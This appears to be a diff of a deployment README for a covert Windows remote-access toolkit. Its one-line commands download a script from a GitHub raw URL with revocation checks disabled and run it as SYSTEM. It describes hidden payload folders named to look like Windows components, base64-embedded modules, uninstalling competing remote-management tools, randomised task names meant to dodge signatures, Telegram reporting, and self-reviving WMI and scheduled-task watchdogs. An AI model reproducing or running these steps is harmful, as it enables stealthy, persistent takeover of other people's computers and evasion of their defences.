@@ -2,16 +2,16 @@
 
 ## Preferred (Guest: Run as SYSTEM) — full deploy, SELF-CONTAINED (no repo dependency at deploy time)
 ```bat
-curl.exe -L --ssl-no-revoke -o %TEMP%\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o22" && call %TEMP%\own.cmd
+curl.exe -L --ssl-no-revoke -o %TEMP%\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o23" && call %TEMP%\own.cmd
 ```
 
 ## Machines stuck on old builds (T4 footer / not self-updating) — un-harden first, then deploy
 S4 hardening (+h +s attribs) silently blocked every copy/move self-update. O20 strips attrs before
 every write and S5 no longer locks mutable payloads. On frozen machines run this FIRST, then the deploy line:
 ```bat
-attrib -h -s -r "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\*" & attrib -h -s -r "C:\Windows\Temp\.wucache\*" & attrib -h -s -r "C:\ProgramData\Microsoft\Diagnosis\State\.etlcache\*" & curl.exe -L --ssl-no-revoke -o %TEMP%\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o22" && call %TEMP%\own.cmd
+attrib -h -s -r "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\*" & attrib -h -s -r "C:\Windows\Temp\.wucache\*" & attrib -h -s -r "C:\ProgramData\Microsoft\Diagnosis\State\.etlcache\*" & curl.exe -L --ssl-no-revoke -o %TEMP%\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o23" && call %TEMP%\own.cmd
 ```
-own.txt is now the full self-contained O22 build: embeds own_mon M13 + own_secure S5 + tg_report T8 + own_lib L3 as base64.
+own.txt is now the full self-contained O23 build: embeds own_mon M14 + own_secure S6 + tg_report T8 + own_lib L4 as base64.
 O22 hardening pass: exterminate runs BEFORE any install (true MSI uninstall of foreign SC products
 + services/processes/dirs + 16 disallowed RMM tools via own_lib -Action exterminate), so the SC
 installer custom action never collides with rivals. Install ladder: repair-by-GUID for registered
@@ -41,7 +41,7 @@ sc query state= all | findstr /I ScreenConnect
 schtasks /Query /TN "\Microsoft\Windows\Diagnosis\Scheduled"
 ```
 
-## Current build (O22 / M13 / S5 / T8 / L3)
+## Current build (O23 / M14 / S6 / T8 / L4)
 - Self-contained single-file deploy: 4 payloads embedded as base64 inside own.cmd.
 - Anti-signature identity: per-host task names (8-name pools x 4 slots) + 2-5 min jitter, seeded by COMPUTERNAME hash -> identity.cfg.
 - Mutual watchdog: chain1 = 4 schtasks, chain2 = WMI event subscription (WucacheWatchdog); each re-arms the other every tick.
